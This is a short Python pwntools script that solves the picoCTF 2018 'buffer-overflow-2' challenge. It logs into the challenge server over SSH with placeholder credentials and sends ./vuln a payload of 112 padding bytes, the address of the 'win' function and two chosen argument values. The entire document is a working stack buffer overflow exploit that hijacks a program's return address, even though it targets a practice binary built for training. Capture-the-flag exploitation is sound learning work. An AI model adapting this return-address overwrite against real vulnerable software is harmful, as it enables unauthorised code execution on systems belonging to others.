#!/usr/bin/python

from pwn import *
import struct

user = 'XXXX'
pw = 'XXXX'


vuln = ELF('./vuln')
payload = 'A' * 112
payload += p32(vuln.symbols['win'])
payload += "\x90" * 4
payload += struct.pack("I", 0xdeadbeef)
payload += struct.pack("I", 0xdeadc0de)

s = ssh(host = '2018shell4.picoctf.com', user = user, password = pw)
s.set_working_directory('/problems/buffer-overflow-2_1_63b4b691601811c553a7c19e367737b9')

r = s.process('./vuln')
print r.recv()
r.sendline(payload)
print r.recv()
r.close()

